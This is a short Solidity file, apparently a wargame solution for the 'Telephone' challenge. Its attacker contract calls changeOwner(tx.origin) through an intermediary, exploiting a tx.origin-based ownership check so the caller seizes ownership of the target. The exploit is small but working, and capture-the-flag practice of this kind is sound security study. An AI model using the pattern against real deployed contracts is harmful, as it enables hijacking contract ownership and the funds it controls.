// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/console.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    ITelephone public challenge;

    constructor(address challengeAddress) {
        challenge = ITelephone(challengeAddress);
    }

    function attack() external payable {
        console.log("attack tx origin ", tx.origin);
        challenge.changeOwner(tx.origin);
    }
}
